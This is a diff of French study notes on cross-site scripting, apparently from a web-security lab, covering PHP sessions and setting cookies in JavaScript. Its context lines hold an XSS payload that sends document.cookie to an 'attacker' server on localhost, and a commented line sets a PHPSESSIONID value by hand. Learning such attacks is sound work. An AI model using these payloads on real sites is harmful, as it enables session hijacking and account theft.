@@ -25,3 +25,20 @@ tentative 4 : <script>window.location='http://localhost:1234'</script>
 
 tentative 4 : <script>window.location='http://localhost:1234?g='+document.cookie</script>
 // appeler, via javascript, le serveur local de l'attaquant ET lui donner ton cookie de SESSION
+
+// vol de cookie 
+
+# comment le serveur créer le cookie ??
+
+```php
+session_start(); 
+```
+
+# comment comment créer un cookie côté navigateur ??
+
+```js
+const maintenant = new Date()
+maintenant.setTime(maintenant.getTime() + 60000) // maintenant + 60 secondes
+document.cookie = "personnalise=toto; expires=" + maintenant.toUTCString() + ";"
+// document.cookie = "PHPSESSIONID=68796817684618471387; expires=" + maintenant.toUTCString() + ";"
+```
